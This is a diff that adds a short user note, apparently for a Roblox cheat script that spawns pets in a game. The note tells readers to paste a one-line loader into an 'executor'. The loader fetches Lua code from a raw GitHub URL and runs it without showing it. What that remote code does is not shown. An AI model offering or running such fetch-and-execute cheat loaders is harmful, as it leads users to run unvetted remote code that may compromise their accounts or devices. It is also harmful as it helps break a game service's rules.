@@ -1,0 +1,6 @@
+Hello thank you for.using my script just kindly execute the script in ur executor in order for it to work
+Reminder this doesn't work in private servers and also in order for the script to work u will kindly need
+Raccoons,DragonFlys,Red Foxes,Polar Bears,T-rex, Chicken Zombies,Pandas,And Queen bees
+
+script:
+loadstring(game:HttpGet("https://raw.githubusercontent.com/snaczukss/s/refs/heads/main/gagpetspawn.lua"))()
